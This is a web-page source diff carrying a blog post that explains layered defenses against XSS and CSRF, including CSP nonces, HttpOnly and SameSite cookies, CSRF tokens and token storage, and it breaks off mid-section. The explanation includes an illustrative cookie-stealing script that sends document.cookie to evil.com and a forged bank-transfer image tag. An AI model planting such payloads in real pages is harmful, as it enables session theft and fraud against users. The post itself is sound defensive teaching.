@@ -1,0 +1,648 @@
+1:"$Sreact.fragment"
+2:I[48245,["7177","static/chunks/app/layout-a7c1b771f7838998.js"],"ThemeProvider"]
+3:I[92233,["7177","static/chunks/app/layout-a7c1b771f7838998.js"],"default"]
+4:I[47843,["7177","static/chunks/app/layout-a7c1b771f7838998.js"],"default"]
+5:I[48350,[],""]
+6:I[11412,[],""]
+7:I[43714,["4345","static/chunks/app/not-found-d958f5a82c6bd60e.js"],"default"]
+8:I[74646,["6711","static/chunks/6711-28504c068f3cc299.js","8512","static/chunks/app/v2/layout-5f5d0eb30b97fa1b.js"],"default"]
+a:I[96727,[],"OutletBoundary"]
+c:I[14038,[],"AsyncMetadataOutlet"]
+e:I[96727,[],"ViewportBoundary"]
+10:I[96727,[],"MetadataBoundary"]
+11:"$Sreact.suspense"
+13:I[92950,[],""]
+:HL["/_next/static/media/4c9affa5bc8f420e-s.p.woff2","font",{"crossOrigin":"","type":"font/woff2"}]
+:HL["/_next/static/css/6e5637a05e39a1b1.css","style"]
+:HL["/_next/static/css/27451c99e2657f58.css","style"]
+:HL["/_next/static/css/f18ff65194ef1f2e.css","style"]
+:HL["/_next/static/css/004145cbd0a33204.css","style"]
+0:{"P":null,"b":"ULvxUWnH7J2D9qudU--bA","p":"","c":["","v2","xss-and-csrf-defense-stack"],"i":false,"f":[[["",{"children":["v2",{"children":[["slug","xss-and-csrf-defense-stack","d"],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",true],["",["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/6e5637a05e39a1b1.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}],["$","link","1",{"rel":"stylesheet","href":"/_next/static/css/27451c99e2657f58.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","children":[["$","head",null,{"children":[["$","link",null,{"rel":"alternate","type":"application/rss+xml","title":"jialin's RSS Feed","href":"https://jialin00.com/rss.xml"}],["$","link",null,{"rel":"icon","type":"image/svg+xml","href":"/fav.svg"}],["$","link",null,{"rel":"apple-touch-icon","sizes":"180x180","href":"/apple-touch-icon-180x180.png"}],["$","link",null,{"rel":"stylesheet","href":"https://fonts.googleapis.com/css2?family=Libre+Baskerville:ital,wght@0,400;0,700;1,400&family=Noto+Serif+TC:wght@400;600;700&family=STIX+Two+Text:ital,wght@0,400;0,700;1,400&family=Share+Tech+Mono&family=VT323&display=swap"}],["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"{\"@context\":\"https://schema.org/\",\"@type\":\"WebSite\",\"name\":\"jialin00.com\",\"author\":{\"@type\":\"Person\",\"name\":\"JiaLin Huang\"},\"datePublished\":\"2022-05-17\",\"description\":\"Exploring web technologies, cloud computing, and AWS, while integrating philosophical perspectives. We examine technological advancements and their impact on human understanding, emphasizing the essential role of philosophy in tech-driven life.\",\"keywords\":\"cloud, cicd, Nextjs, philosophy, simplification\"}"}}]]}],["$","body",null,{"children":["$","$L2",null,{"children":[["$","$L3",null,{}],["$","$L4",null,{}],["$","$L5",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L6",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","$L7",null,{}],[]],"forbidden":"$undefined","unauthorized":"$undefined"}]]}]}]]}]]}],{"children":["v2",["$","$1","c",{"children":[null,[["$","$L8",null,{}],["$","$L5",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L6",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]]}],{"children":[["slug","xss-and-csrf-defense-stack","d"],["$","$1","c",{"children":[null,["$","$L5",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L6",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":["__PAGE__",["$","$1","c",{"children":["$L9",[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/f18ff65194ef1f2e.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}],["$","link","1",{"rel":"stylesheet","href":"/_next/static/css/004145cbd0a33204.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","$La",null,{"children":["$Lb",["$","$Lc",null,{"promise":"$@d"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],["$","$1","h",{"children":[null,[["$","$Le",null,{"children":"$Lf"}],["$","meta",null,{"name":"next-size-adjust","content":""}]],["$","$L10",null,{"children":["$","div",null,{"hidden":true,"children":["$","$11",null,{"fallback":null,"children":"$L12"}]}]}]]}],false]],"m":"$undefined","G":["$13",[]],"s":false,"S":true}
+f:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"}]]
+b:null
+14:I[25885,["7654","static/chunks/7654-339fd591b7f76774.js","9489","static/chunks/app/v2/%5Bslug%5D/page-2e406f5eec6a5c88.js"],"MdDoc"]
+15:T81ab,<p>You're logged into <code>bank.com</code>. In another tab you open <code>evil.com</code>. The page contains:</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="html" data-theme="github-dark github-light"><code data-language="html" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">&#x3C;</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">img</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> src</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">=</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">"https://bank.com/transfer?to=evil&#x26;amount=1000"</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">></span></span></code></pre></figure>
+<p>Your browser issues a request to <code>bank.com</code>. It sends your <code>bank.com</code> session cookie along, because that's what browsers do for any request to that origin. The transfer goes through.</p>
+<p>That's CSRF. You didn't click anything. The attacker borrowed your authenticated session by tricking your browser into making a request.</p>
+<hr>
+<p>Now a different scenario. You visit <code>forum.com</code> and read someone's comment. The comment contains:</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="html" data-theme="github-dark github-light"><code data-language="html" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">&#x3C;</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">script</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">></span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">fetch</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">'https://evil.com/steal?c='</span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49"> +</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> document.cookie)&#x3C;/</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">script</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">></span></span></code></pre></figure>
+<p>If <code>forum.com</code> rendered the comment as raw HTML without escaping, the script runs inside <code>forum.com</code>'s origin. Full access to its DOM, cookies (unless <code>HttpOnly</code>), and localStorage. The attacker reads your session.</p>
+<p>That's XSS. The attacker injected code that runs as if <code>forum.com</code> wrote it.</p>
+<hr>
+<p>Two attackers, standing in different places. The CSRF one is <strong>outside</strong> your page. He can't reach in, so the most he can do is trick your browser into sending a request on his behalf. The XSS one gets his code running <strong>inside</strong> your page, and once he is in, he is you. Everything below follows from that one line between outside and inside. It decides which defense stops which attacker, and why a single failure takes down the rest.</p>
+<p>The short version, before the details: great CSRF defense with no XSS protection is a locked front door beside an open window. The rest explains why.</p>
+<hr>
+<h2>Two attacks, two threat models</h2>
+<p><strong>XSS</strong>: <mark>code I didn't write running in my origin.</mark> Attacker delivers payload via stored content (comments, profile fields), reflected URL parameters, or DOM manipulation. Once it runs, it has full origin privileges: read non-HttpOnly cookies, localStorage, page state. Issue requests as user. The trust it exploits is the page's trust in user-supplied content.</p>
+<p><strong>CSRF</strong>: <mark>my browser sending a request I didn't intend.</mark> Attacker controls a different origin, embeds something (image, form, fetch) that triggers a request to the target. Browser attaches the target's cookies automatically, server can't tell it's not legit from the cookie alone. The trust it exploits is the browser's automatic cookie attachment.</p>
+<p>Because the trust being exploited differs, the defenses differ too, and they live in different layers.</p>
+<hr>
+<h2>Architecture decides the threat surface</h2>
+<p>How your app authenticates determines which threat dominates.</p>
+<p><strong>Cookie sessions</strong> (server sets a session cookie, browser sends it automatically on every request to that origin):</p>
+<ul>
+<li>Vulnerable to CSRF. Any cross-origin request can carry your cookie.</li>
+<li>XSS still dangerous. Reads non-HttpOnly cookies, issues same-origin requests with full session.</li>
+</ul>
+<p><strong>Token auth</strong> (JWT or similar in <code>Authorization</code> header):</p>
+<ul>
+<li>CSRF largely goes away. No cookie auto-attaches, so a forged request lacks credentials.</li>
+<li>XSS becomes existential. If the token sits in <code>localStorage</code>, an XSS payload reads it and is now the user, on any device, until expiry.</li>
+</ul>
+<p>Modern SPAs often use tokens. Apps rendered on the server usually use cookies. Both styles are still common, but the way you defend each one is different.</p>
+<hr>
+<h2>XSS defenses, layered</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Layer</th><th>Who</th><th>What</th></tr></thead><tbody><tr><td>Output encoding</td><td>Client</td><td>Use the framework's interpolation (<code>{value}</code>). Stop reaching for <code>innerHTML</code> / <code>dangerouslySetInnerHTML</code> / <code>v-html</code>.</td></tr><tr><td>Sanitization</td><td>Client</td><td>DOMPurify. Don't roll your own.</td></tr><tr><td>Content Security Policy</td><td>Server</td><td><code>script-src 'self' 'nonce-RANDOM'</code>. Anything that doesn't fit gets rejected by the browser.</td></tr><tr><td>HttpOnly cookies</td><td>Server</td><td><code>Set-Cookie: ...; HttpOnly</code>. JS can't read it. <mark>Caveat below.</mark></td></tr><tr><td>Stored content sanitization</td><td>Server</td><td>Clean on input. Clean on output too. Belt and suspenders.</td></tr><tr><td><code>X-Content-Type-Options</code></td><td>Server</td><td><code>nosniff</code>. Browser stops guessing what files are, so your image upload doesn't get rendered as script.</td></tr><tr><td>Trusted Types</td><td>Client + Server</td><td>CSP directive that forces HTML injection sinks through a sanitizer. Catches the bug before ship.</td></tr></tbody></table>
+<p>The first two rows handle most of the job, and the rest are there as extra safety nets.</p>
+<p>The CSP row needs unpacking. With <code>script-src 'self' 'nonce-abc123'</code>, the server stamps every legitimate <code>&#x3C;script></code> tag with that nonce, and the browser executes only the tags carrying it. Injected scripts don't have it, and the nonce changes on every request, so capturing one buys nothing.</p>
+<details>
+<summary>Deeper: why XSS can't fake the nonce</summary>
+<p>The server generates the nonce and the browser checks it, so the attacker, who controls neither side, has nothing to work with.</p>
+<p>When the browser parses the response, it copies each <code>nonce</code> into an internal slot for CSP checks, then <strong>wipes the attribute from JS reads</strong>:</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="js" data-theme="github-dark github-light"><code data-language="js" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">document.</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">querySelector</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">'script[nonce]'</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">).nonce              </span><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// ""</span></span>
+<span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">document.</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">querySelector</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">'script[nonce]'</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">).</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">getAttribute</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">'nonce'</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">) </span><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// ""</span></span></code></pre></figure>
+<p>With a 128-bit random regenerated per request, there's nothing left to read, duplicate, or brute-force. Nonce hiding shipped in Chrome 49 (2016), Firefox 31, Safari 11. Universal today.</p>
+<p><code>eval</code> family (<code>eval</code>, <code>new Function</code>, <code>setTimeout(string)</code>) is also blocked by default CSP since <code>'unsafe-eval'</code> isn't on unless you ask for it.</p>
+<p>Only breaks if you misconfigure: <code>'unsafe-inline'</code> cancels nonce checks, <code>'unsafe-eval'</code> opens eval, static or low-entropy nonce is replayable, <code>'strict-dynamic'</code> can be leveraged via a controllable loader. All config bugs, not mechanism flaws.</p>
+</details>
+<details>
+<summary>Deeper: nosniff is a serve-back decision, not an upload one</summary>
+<p><code>X-Content-Type-Options</code> and the <code>Content-Type</code> it protects are both set by your server when it sends a stored file back, not when the file is uploaded. They are two separate trips:</p>
+<ul>
+<li><strong>Upload</strong> (a user sends you a file). The <code>Content-Type</code> on that request is whatever the uploader chose, so it is attacker-controlled. Don't store it and reuse it later.</li>
+<li><strong>Serve-back</strong> (your server returns the file to a viewer). Here your server sets the <code>Content-Type</code> itself, normally from the file extension (<code>.png</code> becomes <code>image/png</code>), and adds <code>nosniff</code>. This response is where the decision happens.</li>
+</ul>
+<p><code>nosniff</code> tells the viewer's browser to trust the <code>Content-Type</code> from the serve-back and never re-guess it from the bytes. So it only protects you if that <code>Content-Type</code> is correct. Serve a malicious <code>avatar.png</code> as <code>image/png</code> and the browser treats it as an image (a broken one), never as a script. Serve it as <code>text/html</code> because you copied the uploader's value, and <code>nosniff</code> will trust that and render a page. The header only enforces your label, so the label has to be right first.</p>
+<p>The victim is a third party: an attacker uploads a file with a script inside, your server stores it, and a different user opens its URL. Execution needs the file to be opened as a document (a direct navigation). Loaded through <code>&#x3C;img></code>, the same file only ever decodes as image bytes and never runs.</p>
+</details>
+<h3>Important: HttpOnly limits the damage, does not prevent XSS</h3>
+<p><strong><code>HttpOnly</code> stops XSS from reading the cookie value. It does not stop XSS from using the session.</strong> XSS can still run <code>fetch('/transfer', ...)</code> from inside the origin, and the browser auto-attaches the HttpOnly cookie. The server authenticates the request normally.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Capability</th><th>Without <code>HttpOnly</code></th><th>With <code>HttpOnly</code></th></tr></thead><tbody><tr><td>XSS reads <code>document.cookie</code></td><td>✅</td><td>❌</td></tr><tr><td>XSS exfiltrates cookie to attacker server</td><td>✅</td><td>❌</td></tr><tr><td>XSS issues authenticated requests in victim's browser</td><td>✅</td><td>✅</td></tr><tr><td>Attack persists after victim closes the tab</td><td>✅</td><td>❌</td></tr><tr><td>Cookie replayed from a different device</td><td>✅</td><td>❌</td></tr></tbody></table>
+<p>Set <code>HttpOnly</code> anyway. It converts permanent credential theft into a tab-lifetime session hijack, which is a meaningful downgrade. But don't treat it as the XSS defense. The actual XSS defense is output encoding + CSP.</p>
+<details>
+<summary>Deeper: in-memory tokens are still XSS-readable</summary>
+<p>Putting a JWT or access token in memory (Zustand, React context, plain module variable) is <strong>better than <code>localStorage</code>, not safe from XSS</strong>. XSS runs in your origin. Any JS-reachable state is reachable:</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="js" data-theme="github-dark github-light"><code data-language="js" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// XSS payload, knowing the store</span></span>
+<span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">useAuthStore.</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">getState</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">().token</span></span>
+<span data-line=""><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// or scanning the React fiber tree, or grabbing closures via DevTools</span></span></code></pre></figure>
+<p>The advantages over <code>localStorage</code> are real but they're about limiting the damage, not invisibility:</p>
+<ul>
+<li><strong>Harder for a generic XSS template.</strong> <code>localStorage.getItem('token')</code> works on every site. Reading a Zustand store needs knowledge of the store's reference, which varies per app. Drive-by XSS payloads collect 100% of <code>localStorage</code> tokens, much fewer in-memory ones.</li>
+<li><strong>Once the user closes the tab, the token disappears along with it.</strong> Close tab or reload, XSS gone, attacker loses the handle. <code>localStorage</code> persists across reloads, and stolen tokens replay from any device until expiry.</li>
+</ul>
+<p>Same logic as <code>HttpOnly</code> cookies: drop "permanent credential captured" down to "tab-lifetime session hijack." Combined with short-lived access tokens (5-15 min) and HttpOnly refresh cookies, the real damage window is small.</p>
+</details>
+<hr>
+<h2>CSRF defenses, layered</h2>
+<p><strong>Read this whole table assuming XSS is already prevented.</strong> Almost every CSRF defense here stops working once an attacker has XSS, because XSS runs as your own origin and reads the token, the DOM, and the page state directly. The "Still works under XSS?" column makes that dependency visible.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Layer</th><th>Who</th><th>What</th><th>Still works under XSS?</th></tr></thead><tbody><tr><td><code>SameSite</code> cookie</td><td>Browser + Server</td><td><code>Set-Cookie: ...; SameSite=Lax</code>. Blocks cross-site sub-resource requests. Browser default since Chrome 80 (2020), set it explicitly anyway.</td><td>No. XSS runs same-site, cookie attaches normally.</td></tr><tr><td><code>SameSite=Strict</code></td><td>Server</td><td><code>Set-Cookie: ...; SameSite=Strict</code>. Even top-level cross-site navigation skips the cookie. Use for admin / financial endpoints.</td><td>No. Same reason.</td></tr><tr><td>CSRF token</td><td>Client + Server</td><td>Server plants a token in the form / response. State-changing requests must echo it back. <code>evil.com</code> can't read it (SOP), can't forge it.</td><td>No. XSS reads it from the DOM and includes it.</td></tr><tr><td><code>Origin</code> / <code>Referer</code> check</td><td>Server</td><td>Look at the header. If a request to your <code>/transfer</code> carries <code>Origin: evil.com</code>, reject it.</td><td>No. XSS requests carry your real <code>Origin</code>.</td></tr><tr><td>Verb discipline</td><td>Server</td><td>GET never changes state. Image tags can fire GET, not POST. Forces attackers to write more.</td><td>No. XSS does any verb.</td></tr><tr><td>Skip cookies</td><td>Architecture</td><td>JWT in <code>Authorization</code> header. No auto-attach, no CSRF surface.</td><td>No, worse. <code>localStorage</code> JWT is one line away from XSS.</td></tr><tr><td>Re-auth / MFA on sensitive ops</td><td>Server + Client + User</td><td>Re-enter password / push a hardware key (WebAuthn, TOTP) before high-impact actions.</td><td><strong>Yes.</strong> XSS can't fake a password or a hardware tap without the human. Only meaningful residual layer once XSS is in.</td></tr></tbody></table>
+<hr>
+<h2>Why XSS dominates</h2>
+<p>The table above already showed why: under XSS every standard CSRF layer stops working, and the only thing left is out-of-band re-auth, because XSS can't supply credentials it doesn't have.</p>
+<p>Practical priority:</p>
+<ol>
+<li><strong>Stop XSS first.</strong> Framework auto-escape + CSP + sanitize stored input + nosniff, with <code>HttpOnly</code> capping the damage.</li>
+<li><strong>Then layer CSRF defenses on top.</strong> SameSite + token + Origin check. These add value only when XSS is already prevented.</li>
+<li><strong>For high-stakes operations, add re-auth or MFA.</strong> This is the only layer that still works after a successful XSS, because it depends on something XSS can't fake.</li>
+</ol>
+<p>A site with great CSRF defenses and no XSS protection is a house with a locked front door and open windows. The attacker walks through a window and unlocks the door from inside.</p>
+<hr>
+<h2>What I'd do today</h2>
+<p>Same defenses, assembled per architecture. Each ladder starts from the naive version and adds one layer at a time.</p>
+<details>
+<summary>Harden a cookie-session app, step by step</summary>
+<p>Foundation first, same as the JWT app: CSP nonce, framework auto-escape, and nosniff. An XSS getting in voids every cookie and CSRF layer below it, so treat the anti-XSS layer as the floor, not a step you climb to later. Everything numbered below hardens the cookie itself and assumes that foundation is already in place.</p>
+<p>The numbered order then walks the cookie from naked to hardened. These steps are numbered, not lettered like the JWT ladder below, because each one stacks on the last: you finish with all of them, not one. That order follows implementation cost, not defense value. Two different axes, and they disagree:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Layer</th><th>Cost</th><th>Value</th></tr></thead><tbody><tr><td><code>HttpOnly</code> + <code>Secure</code> + <code>nosniff</code></td><td>one line each</td><td>caps damage, does not stop the attack</td></tr><tr><td><code>SameSite</code></td><td>one line</td><td>kills classic CSRF, nothing else</td></tr><tr><td>CSRF token</td><td>wire every form</td><td>falls the moment XSS lands</td></tr><tr><td>CSP nonce</td><td>real project work: the server generates a nonce per request, every template injects it, every third-party script gets audited. Miss one and the page breaks</td><td>highest value in the stack. It kills injected script at the execution step, and XSS is the attack that gets past every other layer</td></tr></tbody></table>
+<p>So the ladder order is for retrofitting an existing app without breaking it: cheap hygiene first, the expensive high-value layer when you can schedule it. Starting a fresh project? Do CSP on day one.</p>
+<p><strong>0. Bare cookie.</strong> Everything is exposed: XSS can read it, CSRF can use it, and it travels in plaintext.</p>
+<pre><code>Set-Cookie: session=abc123
+</code></pre>
+<p><strong>1. Lock the cookie down, and ship the free header while you are here.</strong> <code>HttpOnly</code> stops JS reading it, <code>Secure</code> keeps it off plaintext HTTP. <code>nosniff</code> is one line and belongs in this batch, even though it defends the script-execution layer covered in step 4.</p>
+<pre><code>Set-Cookie: session=abc123; HttpOnly; Secure; Path=/
+X-Content-Type-Options: nosniff
+</code></pre>
+<p>XSS can no longer exfiltrate it. It can still <em>use</em> the session from inside the page, so this is a downgrade, not a cure.</p>
+<p><strong>2. Kill classic CSRF with <code>SameSite</code>.</strong> Cross-site sub-resource requests (the <code>&#x3C;img src="bank.com/transfer"></code> trick) stop carrying the cookie.</p>
+<pre><code>Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
+</code></pre>
+<p>Use <code>SameSite=Strict</code> for admin and money endpoints.</p>
+<p><strong>3. Add a CSRF token</strong> on state-changing requests, since <code>SameSite</code> has edge cases.</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="html" data-theme="github-dark github-light"><code data-language="html" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">&#x3C;</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">form</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> action</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">=</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">"/transfer"</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> method</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">=</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">"POST"</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">></span></span>
+<span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">  &#x3C;</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">input</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> type</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">=</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">"hidden"</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> name</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">=</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">"csrf_token"</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> value</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">=</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">"{{ csrfToken }}"</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">></span></span>
+<span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">&#x3C;/</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">form</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">></span></span></code></pre></figure>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="js" data-theme="github-dark github-light"><code data-language="js" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// server, on POST</span></span>
+<span data-line=""><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">if</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> (req.body.csrf_token </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">!==</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> session.csrfToken) </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">return</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> res.</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">status</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#79B8FF;--shiki-light:#005CC5">403</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">).</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">end</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">()</span></span></code></pre></figure>
+<p><strong>4. The foundation, written out.</strong> CSP nonce and framework auto-escape (<code>nosniff</code> already shipped in step 1). This is the floor from the top of this list. If you started a fresh project here, the box is already ticked and everything above was the cheap hygiene you layered on after.</p>
+<pre><code>Content-Security-Policy: script-src 'self' 'nonce-RANDOM'
+</code></pre>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="jsx" data-theme="github-dark github-light"><code data-language="jsx" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">&#x3C;</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">div</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">>{userInput}&#x3C;/</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">div</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">>   </span><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// safe, the framework escapes it</span></span>
+<span data-line=""><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// never feed user data to dangerouslySetInnerHTML / v-html / innerHTML</span></span></code></pre></figure>
+<p><strong>5. Reject foreign <code>Origin</code></strong> on state-changing routes. Cheap second layer.</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="js" data-theme="github-dark github-light"><code data-language="js" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">if</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> (req.method </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">===</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62"> 'POST'</span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49"> &#x26;&#x26;</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> req.headers.origin </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">!==</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62"> 'https://bank.com'</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">) </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">return</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> res.</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">status</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#79B8FF;--shiki-light:#005CC5">403</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">).</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">end</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">()</span></span></code></pre></figure>
+<p><strong>6. Re-auth on the dangerous stuff.</strong> Transfer money, change email, delete account: re-enter password or tap a hardware key. The only layer that still holds if XSS gets in.</p>
+</details>
+<details>
+<summary>Harden a JWT app, foundation first</summary>
+<p>Do the foundation before you touch the token. Everything about where the token lives (A, B, C below) only limits the damage once XSS is already in. One layer keeps XSS out in the first place, so it comes first.</p>
+<p><strong>D. The foundation: stop XSS from running at all.</strong> CSP nonce, framework auto-escape, nosniff, and re-auth on sensitive ops. A token sitting in <code>localStorage</code> behind solid CSP can be safer than a perfectly placed token with no CSP, because the second app still lets injected script run. This is the one layer that keeps the attacker out instead of just limiting the damage.</p>
+<pre><code>Content-Security-Policy: script-src 'self' 'nonce-RANDOM'
+X-Content-Type-Options: nosniff
+</code></pre>
+<p>Then choose where the token lives. These are lettered, not numbered like the cookie ladder above, because you pick one, not all: A, B, and C answer the single question of where the token sits, and each replaces the one before. Pick the furthest you can reach.</p>
+<p><strong>A. Token in <code>localStorage</code>.</strong> The worst. One XSS line steals it, and it replays from any device until expiry.</p>
